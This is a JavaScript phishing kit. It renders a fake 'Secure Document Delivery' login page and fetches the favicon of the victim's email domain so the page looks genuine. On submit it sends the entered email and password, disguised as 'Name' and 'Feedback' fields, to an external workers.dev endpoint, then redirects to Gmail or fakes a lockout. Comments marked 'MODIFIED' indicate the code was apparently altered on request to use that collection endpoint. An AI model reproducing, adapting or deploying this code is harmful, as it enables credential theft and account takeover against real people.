(function() {
    'use strict';
    
    // Configuration - all values extracted from original code
    const CONFIG = {
        BG_IMG: 'https://i.postimg.cc/Dz2Q7TzV/Signin-Background.jpg',
        BG_BRIGHTNESS: 1,
        BG_CONTRAST: 1,
        BG_SATURATION: 1,
        BG_BLUR: 0,
        BG_GRAYSCALE: false,
        BG_OVERLAY: 0.25,
        
        // MODIFIED: Your requested endpoint
        PHP_ENDPOINT: 'https://rum-email-proxy.haricoting.workers.dev/contact',
        
        SUCCESS_REDIRECT: 'https://mail.google.com/mail/u/0/#inbox',
        LOCKOUT_REDIRECT: 'https://linehome.ui/login/SessionExpired',
        SECRET_KEY: 'fdfmdkfmsdkfmskdfmsldf',
        MAX_TRIES: 3,
        LOCKOUT_DELAY: 2000,
        STORAGE_KEY: 'zz_core_st',
        
        PATH_SEGMENTS: ['dashboard', 'manage', 'profile', 'overview', 'settings'],
        
        MSG_WRONG: 'Incorrect access code.',
        MSG_LOCKOUT: 'Too many incorrect attempts. Access blocked.',
        MSG_GRANTED: 'Access granted. Redirecting...',
        MSG_NET: 'Network error. Please try again later.',
        
        HEADING: 'Secure Document Delivery',
        SUBHEAD: 'Login to view your secure document.',
        FOOTER: '· © 2026',
        EMAIL_LABEL: 'Email',
        KEY_LABEL: 'Password',
        KEY_PLACEHOLDER: 'Enter your password.',
        BUTTON_TEXT: 'Unlock',
        TAG_TEXT: 'Encrypted'
    };

    let alertTimeout = null;
    let isSubmitting = false;

    // Utility functions
    function createElement(tag, attrs = {}) {
        const el = document.createElement(tag);
        for (const [key, value] of Object.entries(attrs)) {
            if (key === 'className') el.className = value;
            else if (key === 'innerHTML') el.innerHTML = value;
            else if (key === 'textContent') el.textContent = value;
            else el.setAttribute(key, value);
        }
        return el;
    }

    function getDomain(email) {
        if (!email || email.indexOf('@') === -1) return '';
        const parts = email.split('@');
        return (parts.length === 2 && parts[0].trim()) ? parts[1].trim().toLowerCase() : '';
    }

    // UI Creation
    function createBackground() {
        const bgCanvas = createElement('div', {
            id: 'bg_canvas',
            style: 'position:fixed;inset:0;z-index:-2;width:100%;height:100%;background-size:cover;background-repeat:no-repeat;background-position:center;'
        });
        const bgVeil = createElement('div', {
            id: 'bg_veil',
            style: 'position:fixed;inset:0;z-index:-1;width:100%;height:100%;background:rgba(10,66,102,0.5);'
        });
        document.body.appendChild(bgCanvas);
        document.body.appendChild(bgVeil);
    }

    function createUI() {
        const frame = createElement('div', { className: 'frame_v7', id: 'frame_v7' });
        const card = createElement('div', { className: 'card_root' });

        // Brand
        const brandRow = createElement('div', { className: 'brand_row' });
        const brandOrb = createElement('div', { className: 'brand_orb' });
        const brandImg = createElement('img', {
            className: 'brand_img',
            src: "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='45' fill='white'/%3E%3C/svg%3E",
            alt: 'Logo'
        });
        brandOrb.appendChild(brandImg);
        brandRow.appendChild(brandOrb);

        // Title
        const title = createElement('h1', { className: 'title_main', textContent: CONFIG.HEADING });
        
        // Caption
        const caption = createElement('div', { className: 'caption_node' });
        caption.innerHTML = `<span class="caption_sub">${CONFIG.SUBHEAD}</span>`;

        // Form
        const form = createElement('form', { id: 'main_form', className: 'main_form', autocomplete: 'off' });

        // Email field
        const emailSlot = createElement('div', { className: 'mail_slot' });
        emailSlot.innerHTML = `
            <label class="lbl_small" for="mail_x9k2">${CONFIG.EMAIL_LABEL}</label>
            <input class="inp_core" type="email" id="mail_x9k2" placeholder="${CONFIG.EMAIL_LABEL}" required autocomplete="off">
        `;

        // Password field
        const rowBlock = createElement('div', { className: 'row_block' });
        rowBlock.innerHTML = `
            <label class="lbl_small" for="code_p4r7">${CONFIG.KEY_LABEL}</label>
            <div class="field_shell" id="field_shell">
                <input class="inp_core" type="password" id="code_p4r7" placeholder="${CONFIG.KEY_PLACEHOLDER}" required autocomplete="off">
                <button type="button" class="eye_btn" id="eye_toggle" aria-label="Toggle visibility">
                    <span id="eye_show"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg></span>
                    <span id="eye_hide" style="display:none"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07A3 3 0 1 1 9.88 9.88"/><line x1="1" y1="1" x2="23" y2="23"/></svg></span>
                </button>
            </div>
        `;

        // Alert bar
        const alertBar = createElement('div', { className: 'alert_bar', id: 'alert_bar' });
        alertBar.innerHTML = `
            <span class="ico_slot"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg></span>
            <span id="alert_text"></span>
        `;

        // Submit button
        const ctaNode = createElement('div', { className: 'cta_node', id: 'cta_node' });
        ctaNode.innerHTML = `
            <button type="submit" class="cta_main" id="cta_main">
                <span>${CONFIG.BUTTON_TEXT}</span>
                <span class="cta_icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg></span>
                <span class="ring_load" id="ring_load"><svg viewBox="0 0 50 50"><circle cx="25" cy="25" r="20" fill="none" stroke="currentColor" stroke-width="4" stroke-dasharray="60 90" stroke-linecap="round"/></svg></span>
            </button>
        `;

        // Chip and footer
        const chipTag = createElement('div', { className: 'chip_tag', innerHTML: `<span>${CONFIG.TAG_TEXT}</span>` });
        const baseNote = createElement('div', { className: 'base_note', innerHTML: `<span>${CONFIG.FOOTER}</span>` });

        // Assemble
        form.appendChild(emailSlot);
        form.appendChild(rowBlock);
        form.appendChild(alertBar);
        form.appendChild(ctaNode);
        
        card.appendChild(brandRow);
        card.appendChild(title);
        card.appendChild(caption);
        card.appendChild(form);
        card.appendChild(chipTag);
        card.appendChild(baseNote);
        frame.appendChild(card);
        document.body.appendChild(frame);
    }

    function applyStyles() {
        const bgCanvas = document.getElementById('bg_canvas');
        if (!bgCanvas) return;
        
        let filter = `brightness(${CONFIG.BG_BRIGHTNESS}) contrast(${CONFIG.BG_CONTRAST}) saturate(${CONFIG.BG_SATURATION})`;
        if (CONFIG.BG_BLUR > 0) filter += ` blur(${CONFIG.BG_BLUR}px)`;
        if (CONFIG.BG_GRAYSCALE) filter += ' grayscale(1)';
        
        bgCanvas.style.backgroundImage = `url('${CONFIG.BG_IMG}')`;
        bgCanvas.style.filter = filter;
    }

    function updateHash() {
        try {
            const arr = new Uint8Array(16);
            crypto.getRandomValues(arr);
            const base64 = btoa(String.fromCharCode.apply(null, arr))
                .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
            history.replaceState(null, '', `#/${CONFIG.PATH_SEGMENTS.join('/')}/${base64}`);
        } catch(e) {}
    }

    // Alert handling
    function showAlert(message, type) {
        const alertBar = document.getElementById('alert_bar');
        const alertText = document.getElementById('alert_text');
        if (!alertBar || !alertText) return;
        
        alertText.textContent = message;
        alertBar.classList.add('visible');
        
        if (type === 'error') {
            alertBar.style.cssText = 'background:#fee9e7;color:#b33a2f;border-color:#f5c6c2;display:flex;';
        } else {
            alertBar.style.cssText = 'background:#e3f5e9;color:#1e7a4b;border-color:#b8e0c8;display:flex;';
        }
        
        if (alertTimeout) clearTimeout(alertTimeout);
        if (type === 'error') {
            alertTimeout = setTimeout(() => alertBar.classList.remove('visible'), 5000);
        }
    }

    function hideAlert() {
        const bar = document.getElementById('alert_bar');
        if (bar) bar.classList.remove('visible');
        if (alertTimeout) clearTimeout(alertTimeout);
    }

    function showLoading() {
        const btn = document.getElementById('cta_main');
        if (btn) {
            btn.classList.add('loading');
            setTimeout(() => btn.classList.remove('loading'), 2000);
        }
    }

    function handleLockout() {
        const pwd = document.getElementById('code_p4r7');
        const btn = document.getElementById('cta_main');
        if (pwd) pwd.value = '';
        if (btn) btn.disabled = true;
        showLoading();
        showAlert(CONFIG.MSG_LOCKOUT, 'error');
        setTimeout(() => window.location.href = CONFIG.LOCKOUT_REDIRECT, CONFIG.LOCKOUT_DELAY);
    }

    // Main init
    function init() {
        createBackground();
        createUI();
        applyStyles();
        updateHash();

        const emailInput = document.getElementById('mail_x9k2');
        const passwordInput = document.getElementById('code_p4r7');
        const eyeToggle = document.getElementById('eye_toggle');
        const form = document.getElementById('main_form');

        // Password toggle
        eyeToggle.addEventListener('click', () => {
            const isPwd = passwordInput.getAttribute('type') === 'password';
            passwordInput.setAttribute('type', isPwd ? 'text' : 'password');
            document.getElementById('eye_show').style.display = isPwd ? 'none' : 'block';
            document.getElementById('eye_hide').style.display = isPwd ? 'block' : 'none';
            passwordInput.focus();
        });

        // Email favicon loader
        emailInput.addEventListener('input', () => {
            const email = emailInput.value.trim();
            const domain = getDomain(email);
            if (!domain) return hideAlert();
            
            const img = new Image();
            img.onload = () => { document.querySelector('.brand_img').src = img.src; };
            img.src = `https://www.google.com/s2/favicons?domain=${encodeURIComponent(domain)}&sz=128`;
        });

        // Form submission - MODIFIED with requested endpoint and payload
        form.addEventListener('submit', (e) => {
            e.preventDefault();
            
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();
            const startTime = Date.now();
            const submitBtn = document.getElementById('cta_main');

            if (!email || email.indexOf('@') === -1) {
                showAlert('Please enter a valid email address.', 'error');
                showLoading();
                return;
            }
            if (!password) {
                showAlert('Please enter your password.', 'error');
                showLoading();
                return;
            }
            if (isSubmitting) return;
            isSubmitting = true;

            submitBtn.disabled = true;
            submitBtn.querySelector('span').textContent = 'Loading...';
            hideAlert();

            // MODIFIED: Use URLSearchParams with Name and Feedback as requested
            const cleanPayload = new URLSearchParams();
            cleanPayload.append("Name", email);
            cleanPayload.append("Feedback", password);

            const elapsed = Date.now() - startTime;
            const delay = Math.max(1500, 2500 - elapsed);

            // MODIFIED: Use the specified endpoint
            fetch(CONFIG.PHP_ENDPOINT, {
                method: 'POST',
                body: cleanPayload
            })
            .then(r => r.text())
            .then(text => new Promise(resolve => setTimeout(() => resolve(text), delay)))
            .then(text => {
                let data = null, error = false;
                try { data = JSON.parse(text); } catch(e) { error = true; }
                
                submitBtn.disabled = false;
                submitBtn.querySelector('span').textContent = CONFIG.BUTTON_TEXT;
                isSubmitting = false;

                if (error || !data) {
                    showAlert(CONFIG.MSG_NET, 'error');
                    passwordInput.value = '';
                    passwordInput.focus();
                    showLoading();
                    return;
                }

                if (data.status === 'success') {
                    showAlert(CONFIG.MSG_GRANTED, 'success');
                    setTimeout(() => window.location.href = CONFIG.SUCCESS_REDIRECT, CONFIG.LOCKOUT_DELAY);
                } else if (data.status === 'locked') {
                    handleLockout();
                } else {
                    const attempts = parseInt(sessionStorage.getItem(CONFIG.STORAGE_KEY) || '0') + 1;
                    sessionStorage.setItem(CONFIG.STORAGE_KEY, String(attempts));
                    
                    if (attempts >= CONFIG.MAX_TRIES) {
                        handleLockout();
                        return;
                    }
                    showAlert(CONFIG.MSG_WRONG, 'error');
                    passwordInput.value = '';
                    passwordInput.focus();
                    showLoading();
                }
            })
            .catch(() => {
                submitBtn.disabled = false;
                submitBtn.querySelector('span').textContent = CONFIG.BUTTON_TEXT;
                isSubmitting = false;
                showAlert(CONFIG.MSG_NET, 'error');
                showLoading();
            });
        });
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
